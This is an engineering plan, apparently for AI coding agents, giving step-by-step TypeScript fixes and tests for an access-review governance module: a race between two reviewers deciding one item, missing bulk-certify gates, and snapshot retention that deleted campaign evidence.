# Remediation 2 — Governance

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the governance module tell the truth. Two reviewers can no longer both decide one item; retention can no longer delete the evidence a campaign was signed against; the word "revoked" means what §10 says it means; the two transaction-ceiling failures that never recover are batched; the evidence bundle contains evidence; a CSV cell cannot execute; pausing snapshots no longer switches off the integrity alarm; and the capabilities the design requires and the code cannot reach are wired up.

**Architecture:** Fifteen tasks, grouped by the file that owns the defect so each can be accepted or rejected on its own. Tasks 1–3 fix the decision path and the vocabulary it reports in. Task 4 builds the revocation batch the design says a close computes. Tasks 5–8 are the transaction-ceiling work: escalation, re-base, the nightly build's own two, and the remaining sweeps and reports. Task 9 is the SoD evaluator's edges. Tasks 10–11 are the exported artifacts — the bundle, the CSV, and the audit of a refusal. Tasks 12–13 are the switches that are wired wrong and the capabilities wired to nothing. Tasks 14–15 are the smaller correctness fixes, split by whether they share a file.

**Tech Stack:** TypeScript (ESM, strict, `exactOptionalPropertyTypes`), Prisma + PostgreSQL, Fastify, React/Vite, vitest (forks pool, one database per worker), pnpm workspaces.

**Spec:** `docs/superpowers/specs/2026-08-24-audit-findings.md` — §6 (G1–G27). Design under remediation: `docs/superpowers/specs/2026-08-16-syntra-govern-design.md`.

## Global Constraints

- Node `>=22`; pnpm pinned to `9.12.0` via `packageManager`. Never run `npm` or a different pnpm.
- **The full root vitest suite takes ~155 minutes at `SYNTRA_TEST_WORKERS=4`. Never run it to check one change** — run the specific file, e.g. `npx vitest run packages/core/src/govern/decision-service.test.ts`. Every step below names the file to run.
- **`npx tsc -b` must stay green at every commit.** It is the only gate that sees all eight project references, and `packages/contracts` → `packages/core` → `apps/api` → `apps/web` is a chain where a contract edit surfaces four packages away.
- **Prisma interactive transactions abort at 5000 ms.** `withTenant` is `prisma.$transaction(fn)` under that default. No `withTenant` may enclose a loop over a collection bounded by tenant size rather than by a batch constant. `packages/core/src/govern/transaction-budget.test.ts` is the enforcement, and several tasks below extend it.
- **The working tree is not clean and is not yours alone.** Another session is mid-TDD on `packages/core/src/auth/password-reset.test.ts` (tests for an `issuePasswordSetup` that does not exist yet). **Never `git add -A`, never `git commit -a`, and never stage `packages/core/src/auth/password-reset.test.ts`.** Stage only the exact paths each task names.
- Integration tests call `resetDatabase()` in `beforeEach` and go through `withTenant`; never call `prisma` directly for tenant-scoped data in a test.
- A new migration must be named **above `20260830000000`**, because four migrations in this tree are hand-dated ahead of the real clock and `prisma migrate deploy` replays in name order. Only Task 3 adds one.
- Comment voice: long, explanatory, and about the failure that motivated the code. Say WHY. The govern module is written that way throughout and a terse comment reads as a different codebase.
- Commit messages: lower-case type prefix, imperative, no trailing period — e.g. `fix(govern): one decision per item, enforced by the write`.

---

### Task 1: One decision per item, and the gates the bulk path skipped

Spec §6.1 — **G1** (two reviewers can both decide one item), **G7** (`bulkCertify` skips the single-item gates), **G17** (`blocked_no_reviewer → certified` is a transition `CERTIFYING_TRANSITIONS` says does not exist).

All three live in `decision-service.ts` and all three are the same shape: a status is read, a decision is made about it, and the write does not re-assert what was read. `recordCampaignDecision` re-reads inside the write transaction (line 313) and then writes with `update({ where: { id } })` — no predicate, READ COMMITTED, no row lock, and no unique index on `CampaignDecision(itemId)`. Under `quorum: 'any'` — normal for a role or group selector, and true of every escalated item — both reviewers commit. One item carries both a certify and a revoke; `HoldingCertification` says "certified" for an item heading into a revocation batch.

**Resolution chosen:** a **conditional update that moves the status first**, not a unique index on `CampaignDecision(itemId)`. `closeDueCampaigns` deliberately takes the *latest* decision per item — "an item revoked and then re-certified on appeal is certified" — so a one-decision-per-item constraint would forbid a case the close path is written for.

**Files:**
- Modify: `packages/core/src/govern/decision-service.ts:227-231` (the `executing` arm of the campaign-status gate), `:233-237` (the item-status gate), `:311-355` (the write transaction), `:455-500` (the `bulkCertify` gates), `:536-558` (the bulk write loop)
- Test: `packages/core/src/govern/decision-service.test.ts`

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`; `recordEvent` from `../audit/audit-service.js`; `isValidApprover` from `../automate/approvers.js`; `governSettings` from `./settings-service.js`; the file's own `CampaignDecisionRefusedError`, `isBulkCertifiable`, `projectCertification`.
- Produces: no signature change. `recordCampaignDecision(tenantId, input, options) => Promise<{ status: string }>` and `bulkCertify(tenantId, input, options) => Promise<{ certified: number; refused: { itemId: string; reason: string }[] }>` keep their shapes. `CERTIFYING_TRANSITIONS` still holds exactly one row, `{ from: 'pending', to: 'certified', causedBy: 'CampaignDecision' }`, and both entry points now honour it.

- [ ] **Step 1: Write the failing test for the race**

Add to the end of `packages/core/src/govern/decision-service.test.ts`:

```ts
/**
 * TWO REVIEWERS, ONE ITEM, AT THE SAME MOMENT.
 *
 * `quorum: 'any'` is the normal shape for a role or group selector and it is
 * true of EVERY escalated item, because escalation ADDS a reviewer rather than
 * replacing one. So two people holding one item is ordinary, not exotic.
 *
 * The old form read the status here and then wrote with
 * `update({ where: { id } })` -- no predicate, under READ COMMITTED. Both
 * transactions read `pending`, both committed, and the item ended up carrying a
 * certify AND a revoke: `HoldingCertification` said "certified" for a holding
 * on its way into a revocation batch, and `closeDueCampaigns` broke the tie on
 * `decidedAt`, which is identical within a second.
 */
describe('two reviewers deciding one item at once', () => {
  const race = async (itemId: string) =>
    Promise.allSettled([
      recordCampaignDecision(
        tenantId,
        {
          itemId,
          deciderPersonId: person['Bram']!,
          deciderUserId: user['Bram']!,
          decision: 'certify',
          comment: null,
        },
        { now: NOW },
      ),
      recordCampaignDecision(
        tenantId,
        {
          itemId,
          deciderPersonId: person['Jan']!,
          deciderUserId: user['Jan']!,
          decision: 'revoke',
          comment: 'not needed any more',
        },
        { now: NOW },
      ),
    ]);

  it('lets exactly one of them through', async () => {
    const itemId = await seedItem('Anna');
    await assign(itemId, 'Bram');
    await assign(itemId, 'Jan');

    const outcomes = await race(itemId);
    expect(outcomes.filter((o) => o.status === 'fulfilled')).toHaveLength(1);
    const rejected = outcomes.find((o) => o.status === 'rejected') as PromiseRejectedResult;
    expect(rejected.reason).toBeInstanceOf(CampaignDecisionRefusedError);
    expect(rejected.reason.code).toBe('item_not_pending');
  });

  it('records ONE decision row, and the projection agrees with the item', async () => {
    const itemId = await seedItem('Anna');
    await assign(itemId, 'Bram');
    await assign(itemId, 'Jan');

    await race(itemId);

    const decisions = await withTenant(tenantId, (tx) =>
      tx.campaignDecision.findMany({ where: { itemId } }),
    );
    expect(decisions).toHaveLength(1);

    // The half that made the race visible to an AUDITOR rather than only to
    // the database: a certification row for an item in `revoke_decided`.
    const item = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findUniqueOrThrow({ where: { id: itemId } }),
    );
    const certifications = await withTenant(tenantId, (tx) =>
      tx.holdingCertification.findMany(),
    );
    expect(certifications).toHaveLength(item.status === 'certified' ? 1 : 0);
  });
});

/**
 * §11's item table has no `blocked_no_reviewer -> certified` transition, and
 * `CERTIFYING_TRANSITIONS` -- the constant the structural test asserts over --
 * names `pending` as the only `from`. The gate admitted both, which is
 * unreachable today ONLY because a blocked item has no active reviewer row so
 * the `not_reviewer` refusal fires first. Two guards, one of them wrong, is one
 * move away from the wrong one being the only guard.
 */
describe('a blocked item', () => {
  it('cannot be certified even by somebody assigned to it', async () => {
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, (tx) =>
      tx.campaignItem.update({ where: { id: itemId }, data: { status: 'blocked_no_reviewer' } }),
    );
    await assign(itemId, 'Bram');

    await expect(
      recordCampaignDecision(
        tenantId,
        {
          itemId,
          deciderPersonId: person['Bram']!,
          deciderUserId: user['Bram']!,
          decision: 'certify',
          comment: null,
        },
        { now: NOW },
      ),
    ).rejects.toMatchObject({ code: 'item_not_pending' });
  });
});

/**
 * `bulkCertify` checked NEITHER of the two gates `recordCampaignDecision`
 * refuses on: the campaign's status, and a departed subject.
 *
 * A leaver's items stay `pending` until the nightly `mootDepartedSubjects`
 * sweep runs, so between the departure and that sweep their manager could
 * bulk-certify a person who has left -- which the single path treats as false
 * assurance and refuses in words.
 */
describe('bulkCertify honours the gates the single path enforces', () => {
  it('refuses a campaign that is not open', async () => {
    const itemId = await seedItem('Anna');
    await assign(itemId, 'Bram');
    await withTenant(tenantId, (tx) =>
      tx.campaign.update({ where: { id: campaignId }, data: { status: 'closed_incomplete' } }),
    );

    await expect(
      bulkCertify(
        tenantId,
        {
          campaignId,
          itemIds: [itemId],
          deciderPersonId: person['Bram']!,
          deciderUserId: user['Bram']!,
        },
        { now: NOW },
      ),
    ).rejects.toMatchObject({ code: 'campaign_not_open' });
  });

  it('refuses a departed subject and MOOTS the item, as the single path does', async () => {
    const itemId = await seedItem('Anna');
    await assign(itemId, 'Bram');
    await withTenant(tenantId, (tx) =>
      tx.contract.updateMany({
        where: { personId: person['Anna']! },
        data: { endDate: day('2026-01-01') },
      }),
    );

    const result = await bulkCertify(
      tenantId,
      {
        campaignId,
        itemIds: [itemId],
        deciderPersonId: person['Bram']!,
        deciderUserId: user['Bram']!,
      },
      { now: NOW },
    );

    expect(result.certified).toBe(0);
    expect(result.refused[0]!.reason).toMatch(/has left/);
    const item = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findUniqueOrThrow({ where: { id: itemId } }),
    );
    expect(item.status).toBe('moot');
  });
});
```

Add `CampaignDecisionRefusedError` to the existing import block at the top of the file:

```ts
import {
  CERTIFYING_TRANSITIONS,
  CampaignDecisionRefusedError,
  DECISION_ENTRY_POINTS,
  HIGH_RISK_FLAGS,
  bulkCertify,
  computeReviewQualitySignals,
  isBulkCertifiable,
  openItem,
  recordCampaignDecision,
} from './decision-service.js';
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/decision-service.test.ts -t 'at once'`

Expected: FAIL. Both promises fulfil and two `CampaignDecision` rows exist.

- [ ] **Step 3: Drop `executing` from the campaign-status gate**

`Campaign.status = 'executing'` is written by nothing in the tree — two readers, no writer — and `closeDueCampaigns` closes `open` alone, so anything that *did* set it would never close. This is half of G13; Task 3 removes the other reader and the schema comment.

In `packages/core/src/govern/decision-service.ts`, replace lines 227–231:

```ts
  // `open`, and ONLY `open`. `executing` was in this gate and is written by
  // NOTHING in the tree -- and `closeDueCampaigns` closes `open` alone, so a
  // campaign that somehow reached `executing` would never close and every item
  // in it would stay decidable forever. A status with a reader and no writer is
  // a state machine describing something that does not exist.
  if (facts.campaignStatus !== 'open') {
    throw new CampaignDecisionRefusedError(
      'campaign_not_open',
      `this campaign is ${facts.campaignStatus}`,
    );
  }
```

- [ ] **Step 4: Narrow the item-status gate to `pending`**

Replace lines 233–237:

```ts
  // `pending`, and ONLY `pending`. §11's item table has no
  // `blocked_no_reviewer -> certified` transition and `CERTIFYING_TRANSITIONS`
  // -- the constant the structural test asserts over -- names `pending` as its
  // only `from`. Admitting `blocked_no_reviewer` here contradicted both, and
  // was unreachable only because a blocked item has no active reviewer row so
  // the `not_reviewer` refusal fired first. Two guards, one of them wrong, is
  // one move away from the wrong one being the only guard.
  if (facts.itemStatus !== 'pending') {
    throw new CampaignDecisionRefusedError(
      'item_not_pending',
      `this item is already ${facts.itemStatus}`,
    );
  }
```

- [ ] **Step 5: Make the status move be the lock**

In the write transaction, replace everything from `const item = await tx.campaignItem.findUniqueOrThrow({ where: { id: input.itemId } });` (line 313) down to and including `await tx.campaignItem.update({ where: { id: item.id }, data: { status } });` (line 352) with:

```ts
    const item = await tx.campaignItem.findUniqueOrThrow({ where: { id: input.itemId } });
    const status = input.decision === 'certify' ? 'certified' : 'revoke_decided';

    // THE STATUS MOVES FIRST, UNDER A PREDICATE, AND THE ROW COUNT IS CHECKED.
    //
    // This is the lock. The previous form re-read the status here and then
    // wrote with `update({ where: { id } })` -- no predicate, no row lock, and
    // no unique index on `CampaignDecision(itemId)` -- so under READ COMMITTED
    // two reviewers holding one item both read `pending`, both passed, and both
    // committed. That shape is ordinary rather than exotic: `quorum: 'any'` is
    // normal for a role or group selector, and escalation ADDS a reviewer
    // rather than replacing one, so every escalated item has two. The item then
    // carried a certify AND a revoke -- `HoldingCertification` claiming
    // "certified" for a holding on its way into a revocation batch -- and
    // `closeDueCampaigns` broke the tie on `decidedAt`, which is identical
    // within a second.
    //
    // NOT a unique index on the decision instead. `closeDueCampaigns` takes the
    // LATEST decision per item deliberately -- "an item revoked and then
    // re-certified on appeal is certified" -- so one-decision-per-item would
    // forbid the case the close path is written for. Moving the row is the
    // lock; everything below runs only for the transaction that won it.
    const moved = await tx.campaignItem.updateMany({
      where: { id: item.id, status: 'pending' },
      data: { status },
    });
    if (moved.count !== 1) {
      // The loser re-reads the row it did not get to write, so the message
      // names what actually happened rather than the status it saw earlier.
      const current = await tx.campaignItem.findUniqueOrThrow({
        where: { id: input.itemId },
        select: { status: true },
      });
      throw new CampaignDecisionRefusedError(
        'item_not_pending',
        `this item is already ${current.status}`,
      );
    }

    const lastOrdinal = await tx.campaignDecision.count({
      where: { personId: input.deciderPersonId, item: { campaignId: item.campaignId } },
    });
    // `neverOpened` is recorded as a FACT rather than inferred from a timestamp
    // coincidence: `itemOpenedAt === decidedAt` is also what a decision made in
    // the same second as the open looks like.
    const openedAt = facts.openedAt ?? now;
    const neverOpened = facts.openedAt === null;

    const decision = await tx.campaignDecision.create({
      data: {
        tenantId,
        itemId: item.id,
        personId: input.deciderPersonId,
        decidedByUserId: input.deciderUserId,
        decision: input.decision,
        comment: input.comment,
        itemOpenedAt: openedAt,
        neverOpened,
        decidedAt: now,
        viaBulk: false,
        sessionDecisionOrdinal: lastOrdinal + 1,
        coverageAtDecision: {
          coverageStatus: item.coverageStatus,
          riskFlags: item.riskFlags,
        } as never,
      },
    });
```

The `if (input.decision === 'certify') { await projectCertification(...) }` block and the `recordEvent` call after it are unchanged. Delete the now-duplicated `const status = ...` line that used to sit immediately before the old `campaignItem.update`.

- [ ] **Step 6: Give `bulkCertify` the campaign gate it skipped**

Immediately after `const campaign = await tx.campaign.findUniqueOrThrow({ where: { id: input.campaignId } });` (line 458), insert:

```ts
    // THE SAME GATE THE SINGLE PATH ENFORCES. `bulkCertify` checked
    // `allowBulkCertify` and the tenant's cap and neither of these, so a closed
    // campaign's items could still be certified in bulk while the single path
    // refused them one at a time. A carve-out present on one of two entry
    // points to the same table is not a carve-out; it is a hole.
    if (campaign.status !== 'open') {
      throw new CampaignDecisionRefusedError(
        'campaign_not_open',
        `this campaign is ${campaign.status}`,
      );
    }
```

- [ ] **Step 7: Give `bulkCertify` the departure gate, from one grouped read**

Immediately before `const refused: { itemId: string; reason: string }[] = [];` (line 489), insert:

```ts
    // ONE query over every subject in the batch, not one per item. A bulk
    // certify is capped at `bulkCertifyLimit` items and a contract read per
    // item inside this transaction would be that many round trips against the
    // 5000 ms ceiling.
    const subjectIds = [
      ...new Set(items.map((i) => i.personId).filter((p): p is string => p !== null)),
    ];
    const liveContracts =
      subjectIds.length === 0
        ? []
        : await tx.contract.findMany({
            where: {
              personId: { in: subjectIds },
              startDate: { lte: now },
              OR: [{ endDate: null }, { endDate: { gte: now } }],
            },
            select: { personId: true },
          });
    const stillEmployed = new Set(liveContracts.map((c) => c.personId));
    const departed = new Set(subjectIds.filter((id) => !stillEmployed.has(id)));
```

Then, inside the per-item loop, immediately after the `if (item.personId === input.deciderPersonId) { ... }` block (line 496), insert:

```ts
      // A DEPARTED SUBJECT, refused AND mooted, exactly as the single path does
      // it. Their items stay `pending` until the nightly `mootDepartedSubjects`
      // sweep runs, so between the departure and that sweep a manager could
      // bulk-certify somebody who has left -- which `recordCampaignDecision`
      // calls false assurance and refuses in words. That was the fifth route on
      // this programme to a person's access outliving their employment, and the
      // standing suspicion applies: any code path that special-cases a departed
      // person is suspect until its failure mode is checked.
      if (item.personId !== null && departed.has(item.personId)) {
        await tx.campaignItem.update({
          where: { id: item.id },
          data: {
            status: 'moot',
            statusReason:
              "the subject's contracts have all ended. A certification is a signed statement about somebody's access; signing one for a person who left would be false assurance.",
          },
        });
        refused.push({
          itemId: item.id,
          reason: 'this person has left; the item is now moot and cannot be certified',
        });
        continue;
      }
```

- [ ] **Step 8: Make the bulk write conditional too, and audit what was actually written**

Declare `const certified: string[] = [];` beside `const refused` and `const eligible`. Replace the whole `for (const [index, item] of eligible.entries()) { ... }` loop (line 536) with:

```ts
    for (const [index, item] of eligible.entries()) {
      // The same conditional move as the single path, for the same reason: the
      // eligibility loop above read these statuses in THIS transaction, but a
      // reviewer deciding one of them singly in another transaction is exactly
      // the concurrency this file now refuses to lose.
      const moved = await tx.campaignItem.updateMany({
        where: { id: item.id, status: 'pending' },
        data: { status: 'certified' },
      });
      if (moved.count !== 1) {
        refused.push({ itemId: item.id, reason: 'somebody else decided this item first' });
        continue;
      }

      const openedAt = openedByItem.get(item.id) ?? now;
      const decision = await tx.campaignDecision.create({
        data: {
          tenantId,
          itemId: item.id,
          personId: input.deciderPersonId,
          decidedByUserId: input.deciderUserId,
          decision: 'certify',
          comment: null,
          itemOpenedAt: openedAt,
          neverOpened: !openedByItem.has(item.id),
          decidedAt: now,
          viaBulk: true,
          bulkSize: eligible.length,
          sessionDecisionOrdinal: startOrdinal + index + 1,
          coverageAtDecision: {
            coverageStatus: item.coverageStatus,
            riskFlags: item.riskFlags,
          } as never,
        },
      });
      await projectCertification(tx, item.id, decision.id, input.deciderPersonId);
      certified.push(item.id);
    }
```

Then change the audit block's guard to `if (certified.length > 0) {`, its `bulkSize` to `certified.length`, its `itemIds` to `certified`, and the function's return to `return { certified: certified.length, refused };`. An audit event naming items somebody else decided is a worse record than no event at all.

- [ ] **Step 9: Run the test to verify it passes**

Run: `npx vitest run packages/core/src/govern/decision-service.test.ts`

Expected: PASS, every test in the file including the two pre-existing structural ones.

- [ ] **Step 10: Run the neighbours that read these statuses**

Run: `npx vitest run packages/core/src/govern/reviewer-service.test.ts packages/core/src/govern/revocation-service.test.ts apps/api/src/routes/govern-portal.test.ts`

Expected: PASS. The portal's campaign filter still names `executing`; that is inert because nothing writes it, and Task 3 removes it.

- [ ] **Step 11: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/decision-service.ts \
        packages/core/src/govern/decision-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): one decision per item, enforced by the write

`recordCampaignDecision` re-read the item's status inside the write
transaction and then updated by id with no predicate, under READ
COMMITTED, with no unique index behind it. Two reviewers holding one item
is ordinary -- `quorum: 'any'` is normal for a role or group selector, and
escalation ADDS a reviewer rather than replacing one -- so both read
pending, both passed, and both committed. The item carried a certify and a
revoke at once: HoldingCertification said "certified" for a holding on its
way into a revocation batch, and closeDueCampaigns broke the tie on
decidedAt, which is identical within a second.

The status now moves first, under `where: { status: 'pending' }`, and the
row count is checked. That is the lock. Not a unique index on the
decision: closeDueCampaigns takes the LATEST decision per item on purpose,
so one-per-item would forbid the appeal case it is written for.

bulkCertify got the same conditional move and the two gates it never had.
It checked neither the campaign's status nor a departed subject, so a
closed campaign could still be bulk-certified, and a leaver's items --
which stay pending until the nightly sweep -- could be certified by their
manager, which the single path calls false assurance and refuses.

And both status gates are narrowed to what the state machine says.
`executing` is written by nothing in the tree and closeDueCampaigns closes
only `open`, so anything reaching it would never close; and
`blocked_no_reviewer -> certified` is a transition CERTIFYING_TRANSITIONS
says does not exist.
MSG
)"
```

---

### Task 2: Retention keeps the evidence a campaign was signed against

Spec §6.1 — **G2**. `pruneSnapshots`' own docstring promises that "any snapshot referenced by a campaign, an evidence bundle or an open finding is NEVER pruned while that reference lives". The code checks `EvidencePack` and `GovernFinding` and never looks at `Campaign` at all. `Campaign.snapshotId`, `Campaign.rebasedFromSnapshotId` and `CampaignItem.holdingSnapshotId` are bare `uuid` columns with no foreign key, so nothing stops it at the database either: a `deleteMany` on `AccessSnapshot` succeeds and the campaign is left pointing at nothing.

The consequence is the one this module exists to prevent. A campaign closed 400 days ago is exactly the campaign an auditor asks about, and after the prune its `readableSnapshot(tx, campaign.snapshotId)` throws `not_found` — so the campaign report, the re-base path and the evidence pack all refuse, and the attestation somebody signed can no longer be shown against the facts it was signed about.

**Resolution chosen:** widen the reference set rather than add foreign keys. A `RESTRICT` foreign key would turn the prune into an exception rather than a retention, and an inline `ON DELETE SET NULL` would silently unlink a campaign from its own evidence — which is the same data loss wearing a constraint.

**Files:**
- Modify: `packages/core/src/govern/snapshot-service.ts:635-687` (the whole of `pruneSnapshots`)
- Test: `packages/core/src/govern/snapshot-service.test.ts` (the existing `describe('pruneSnapshots')` block, at line 411)

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`.
- Produces: `pruneSnapshots(tenantId, options?: { now?: Date; retentionDays?: number }) => Promise<{ pruned: number; retainedForReference: number }>` — unchanged signature. `retainedForReference` now counts campaign-held snapshots as well as pack- and finding-held ones.

- [ ] **Step 1: Write the failing test**

Add inside the existing `describe('pruneSnapshots', ...)` block in `packages/core/src/govern/snapshot-service.test.ts`:

```ts
  /**
   * THE PROMISE IN THIS FUNCTION'S OWN DOCSTRING, which the code kept for two
   * of the three references and not for the third.
   *
   * A campaign closed 400 days ago is precisely the campaign an auditor asks
   * about. `Campaign.snapshotId` is a bare uuid with no foreign key, so nothing
   * stopped the delete at the database either -- the campaign was simply left
   * pointing at a snapshot that no longer exists, and `readableSnapshot` then
   * throws `not_found` for its report, its re-base and its evidence pack. The
   * attestation somebody signed can no longer be shown against the facts it was
   * signed about, which is the destruction of evidence this whole module exists
   * to prevent.
   */
  it('NEVER prunes a snapshot a campaign points at', async () => {
    const old = await buildSnapshot(tenantId, {
      now: day('2024-01-01'),
      collect: async () => emptyCollection({ asOf: day('2024-01-01') }),
    });
    const owner = await withTenant(tenantId, (tx) =>
      tx.person.create({ data: { tenantId, givenName: 'Ola', familyName: 'Berg' } }),
    );
    await withTenant(tenantId, (tx) =>
      tx.campaign.create({
        data: {
          tenantId,
          name: 'Q1 2024 review',
          scope: {},
          snapshotId: old.snapshotId,
          reviewerSelector: 'manager',
          fallbackSelector: 'campaign_owner',
          ownerPersonId: owner.id,
          opensAt: day('2024-01-01'),
          dueAt: day('2024-02-01'),
          originalDueAt: day('2024-02-01'),
          status: 'closed_complete',
        },
      }),
    );

    const result = await pruneSnapshots(tenantId, { now: NOW, retentionDays: 30 });
    expect(result).toEqual({ pruned: 0, retainedForReference: 1 });
    expect(
      await withTenant(tenantId, (tx) =>
        tx.accessSnapshot.count({ where: { id: old.snapshotId } }),
      ),
    ).toBe(1);
  });

  /**
   * A re-based campaign points at TWO snapshots and both are evidence: the one
   * it was generated from and the one it was moved onto. §8 rule 2 records the
   * re-base "with counts" precisely so the pair can be compared later, and a
   * comparison with one side deleted is not a comparison.
   */
  it('retains the snapshot a re-based campaign came FROM as well', async () => {
    const from = await buildSnapshot(tenantId, {
      now: day('2024-01-01'),
      collect: async () => emptyCollection({ asOf: day('2024-01-01') }),
    });
    const onto = await buildSnapshot(tenantId, {
      now: day('2024-02-01'),
      collect: async () => emptyCollection({ asOf: day('2024-02-01') }),
    });
    const owner = await withTenant(tenantId, (tx) =>
      tx.person.create({ data: { tenantId, givenName: 'Ola', familyName: 'Berg' } }),
    );
    await withTenant(tenantId, (tx) =>
      tx.campaign.create({
        data: {
          tenantId,
          name: 'Q1 2024 review',
          scope: {},
          snapshotId: onto.snapshotId,
          rebasedFromSnapshotId: from.snapshotId,
          reviewerSelector: 'manager',
          fallbackSelector: 'campaign_owner',
          ownerPersonId: owner.id,
          opensAt: day('2024-01-01'),
          dueAt: day('2024-02-01'),
          originalDueAt: day('2024-02-01'),
          status: 'closed_complete',
        },
      }),
    );

    const result = await pruneSnapshots(tenantId, { now: NOW, retentionDays: 30 });
    expect(result).toEqual({ pruned: 0, retainedForReference: 2 });
  });

  /**
   * And the item's OWN snapshot, which a re-base moves per item -- so a
   * campaign whose items sit on three different snapshots holds all three.
   * `CampaignItem.holdingSnapshotId` is the snapshot the copied attribution set
   * came from, and it is what "attested against these facts" means.
   */
  it('retains a snapshot only a campaign ITEM points at', async () => {
    const itemSnapshot = await buildSnapshot(tenantId, {
      now: day('2024-01-01'),
      collect: async () => emptyCollection({ asOf: day('2024-01-01') }),
    });
    const campaignSnapshot = await buildSnapshot(tenantId, {
      now: day('2024-02-01'),
      collect: async () => emptyCollection({ asOf: day('2024-02-01') }),
    });
    const owner = await withTenant(tenantId, (tx) =>
      tx.person.create({ data: { tenantId, givenName: 'Ola', familyName: 'Berg' } }),
    );
    await withTenant(tenantId, async (tx) => {
      const campaign = await tx.campaign.create({
        data: {
          tenantId,
          name: 'Q1 2024 review',
          scope: {},
          snapshotId: campaignSnapshot.snapshotId,
          reviewerSelector: 'manager',
          fallbackSelector: 'campaign_owner',
          ownerPersonId: owner.id,
          opensAt: day('2024-01-01'),
          dueAt: day('2024-02-01'),
          originalDueAt: day('2024-02-01'),
          status: 'closed_complete',
        },
      });
      await tx.campaignItem.create({
        data: {
          tenantId,
          campaignId: campaign.id,
          holdingSnapshotId: itemSnapshot.snapshotId,
          subjectKey: `person:${owner.id}`,
          personId: owner.id,
          systemId: 'syntra',
          resourceKind: 'syntraGroup',
          resourceId: 'g1',
          resourceName: 'Ward Nurses',
          observedAt: day('2024-01-01'),
          coverageStatus: 'complete',
          status: 'certified',
        },
      });
    });

    const result = await pruneSnapshots(tenantId, { now: NOW, retentionDays: 30 });
    expect(result).toEqual({ pruned: 0, retainedForReference: 2 });
  });
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/snapshot-service.test.ts -t 'pruneSnapshots'`

Expected: FAIL — `{ pruned: 1, retainedForReference: 0 }` for the first case; the snapshot is gone and the campaign points at nothing.

- [ ] **Step 3: Read the campaign references too**

In `packages/core/src/govern/snapshot-service.ts`, replace the block that builds `referenced` — from `const referenced = new Set<string>();` to the closing brace of the last `for` loop over `resolvedBySnapshotId` — with:

```ts
    // THE THREE REFERENCE KINDS THE DOCSTRING PROMISES, and the third of them
    // was missing.
    //
    // `Campaign.snapshotId`, `Campaign.rebasedFromSnapshotId` and
    // `CampaignItem.holdingSnapshotId` are bare uuid columns with NO foreign
    // key, so nothing stopped the delete at the database either: the campaign
    // was left pointing at a snapshot that no longer exists, and
    // `readableSnapshot` then throws `not_found` for its report, its re-base
    // and its evidence pack. A campaign closed 400 days ago is exactly the one
    // an auditor asks about, so the window this defect fires in is the window
    // the evidence matters in.
    //
    // A foreign key was considered and rejected in both forms. `RESTRICT` turns
    // the prune into an exception rather than a retention -- the job dies and
    // nothing else is pruned either -- and `SET NULL` silently unlinks a
    // campaign from its own evidence, which is the same data loss wearing a
    // constraint.
    const referenced = new Set<string>();

    for (const pack of await tx.evidencePack.findMany({
      where: { snapshotId: { in: ids } },
      select: { snapshotId: true },
    })) {
      if (pack.snapshotId !== null) referenced.add(pack.snapshotId);
    }

    // EVERY campaign, not only open ones. A closed campaign is the one whose
    // evidence somebody comes back for; an open one still has reviewers looking
    // at it. Neither may lose the picture it was generated from.
    for (const campaign of await tx.campaign.findMany({
      where: {
        OR: [{ snapshotId: { in: ids } }, { rebasedFromSnapshotId: { in: ids } }],
      },
      select: { snapshotId: true, rebasedFromSnapshotId: true },
    })) {
      if (ids.includes(campaign.snapshotId)) referenced.add(campaign.snapshotId);
      if (campaign.rebasedFromSnapshotId !== null && ids.includes(campaign.rebasedFromSnapshotId)) {
        referenced.add(campaign.rebasedFromSnapshotId);
      }
    }

    // And the item's OWN snapshot, which a re-base moves per item -- so a
    // campaign whose items sit on three snapshots holds all three.
    // `holdingSnapshotId` names where the copied attribution set came from, and
    // that is what "attested against these facts" means. `distinct` rather than
    // a read of every item: a 50,000-item campaign has at most a handful of
    // distinct values and this transaction has a 5000 ms budget.
    for (const item of await tx.campaignItem.findMany({
      where: { holdingSnapshotId: { in: ids } },
      select: { holdingSnapshotId: true },
      distinct: ['holdingSnapshotId'],
    })) {
      referenced.add(item.holdingSnapshotId);
    }

    for (const finding of await tx.governFinding.findMany({
      where: { status: { not: 'resolved' }, subjectRefType: 'snapshot', subjectRefId: { in: ids } },
      select: { subjectRefId: true },
    })) {
      referenced.add(finding.subjectRefId);
    }
    for (const finding of await tx.governFinding.findMany({
      where: { resolvedBySnapshotId: { in: ids } },
      select: { resolvedBySnapshotId: true },
    })) {
      if (finding.resolvedBySnapshotId !== null) referenced.add(finding.resolvedBySnapshotId);
    }
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `npx vitest run packages/core/src/govern/snapshot-service.test.ts`

Expected: PASS, including the pre-existing "prunes past the retention window and NEVER prunes one an evidence pack points at".

- [ ] **Step 5: Run the prune job's own test**

Run: `npx vitest run packages/core/src/govern/jobs.test.ts`

Expected: PASS. `runPruneJob` is the only caller and its assertions are over counts.

- [ ] **Step 6: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/snapshot-service.ts \
        packages/core/src/govern/snapshot-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): retention keeps the evidence a campaign was signed against

pruneSnapshots' own docstring promised that a snapshot referenced by a
campaign, an evidence bundle or an open finding is never pruned. It
checked the pack and the finding and never looked at Campaign at all.

Campaign.snapshotId, Campaign.rebasedFromSnapshotId and
CampaignItem.holdingSnapshotId are bare uuid columns with no foreign key,
so nothing stopped the delete at the database either -- the campaign was
simply left pointing at a snapshot that no longer exists, and
readableSnapshot then throws not_found for its report, its re-base and its
evidence pack. A campaign closed 400 days ago is exactly the one an
auditor asks about, so the window this fires in is the window the evidence
matters in.

No foreign key. RESTRICT turns the prune into an exception rather than a
retention, and SET NULL silently unlinks a campaign from its own evidence,
which is the same data loss wearing a constraint.
MSG
)"
```

